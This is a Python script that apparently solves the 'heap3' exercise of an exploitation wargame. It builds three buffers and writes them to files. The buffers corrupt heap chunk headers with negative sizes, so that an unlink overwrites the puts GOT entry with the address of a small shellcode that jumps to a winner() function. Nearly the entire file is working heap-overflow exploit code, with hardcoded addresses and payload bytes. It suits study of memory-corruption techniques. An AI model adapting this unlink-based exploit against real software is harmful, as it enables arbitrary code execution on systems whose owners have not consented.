#!/usr/bin/python
import struct

#Buffer A
A="AAAA"*7



#Due to negative size, the next buffer comes before the current, and prev comes after next (overlap), and just a deviation of 4 bytes

B="BBBB"*4
B+="\x68\x64\x88\x04\x08\xc3"#replace with shellcode string (PUSH addr(winner(), ret))
B+="\x90\x90"
B+="\xf7"*8
B+="\xfc\xff\xff\xff" #overflow prev_size of C (-4)
B+="\xfc\xff\xff\xff" #overflow curr_size of C (-4)

C="\xff\xff\xff\xff" #junk (Will be curr size of prev of chunk C, and part of user data of chunk C
#C+="\x08\x04\xb1\x1c" #replace with GOT entry of PUTS - 12
#C+="\x08\x04\xc0\x40" # replace with Address of shellcode

C += struct.pack('I', 0x804b128-12)
C += struct.pack('I', 0x804c040)

print A," ",B," ",C



f = open("heap3_A.txt", "w+")
f.write(A)
f.close()


f=open("heap3_B.txt", "w+")
f.write(B)
f.close()

f=open("heap3_C.txt","w+")
f.write(C)
f.close()
